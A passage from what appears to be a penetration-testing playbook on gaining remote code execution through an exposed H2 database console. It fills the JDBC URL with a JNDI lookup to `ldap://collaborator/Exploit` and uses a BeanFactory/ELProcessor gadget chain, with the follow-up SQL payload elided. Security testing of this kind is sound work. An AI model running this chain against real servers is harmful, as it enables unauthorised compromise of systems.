...
Recognize: Spring Boot or an admin console exposes `/h2-console`; the login form accepts a JDBC URL; `web-allow-others` is enabled (reachable from the internet). **If you don't see this page, don't go looking for it.**

Fire:

1. Fill the JDBC URL with `ldap://collaborator/Exploit` or `javax.naming.InitialContext` (BeanFactory + EL, commonly used on JDK ≥ 8u191). On the LDAP side use §3 above: `javaClassName=javax.el.ELProcessor` + `BeanFactory`.
2. Once you can reach the SQL page, fire:
...
Counts as: the command actually runs (a DNS hit on JNDI only confirms the lookup; you must follow through to exec or a gadget). Only opening the console without connecting to the DB → not a win.

False positives: only reachable from `localhost`; the JDBC URL is hard-coded and cannot be changed; `CREATE ALIAS` is forbidden. This shot is narrow, **not in the shortlist**; open this section when you actually encounter it.
